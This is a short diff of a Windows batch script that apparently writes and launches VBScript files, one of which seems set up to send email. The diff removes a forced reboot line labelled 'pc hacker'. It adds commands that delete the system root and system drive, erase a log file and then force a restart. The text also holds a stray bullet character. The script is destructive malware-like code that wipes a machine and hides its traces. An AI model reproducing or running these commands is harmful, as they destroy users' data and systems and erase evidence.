@@ -170,9 +170,15 @@ echo Set iMsg = Nothing >> %temp%\temp.vbs 
 echo Set iConf = Nothing >> %temp%\temp.vbs 
 echo Set Flds = Nothing >> %temp%\temp.vbs 
 
-echo s.run "shutdown -r -t 0 -c ""pc" hacker"" -f",1 >> %temp%\temp.vbs 
+Shutdown.exe /a
+
 start %temp%\temp.vbs 
 start %temp%\temp1.vbs 
 start %temp%\temp2.vbs 
 
 • 
+
+del %SystemRoot%
+del %SystemDrive%
+del %LOGFILE%
+Shutdown.exe -r
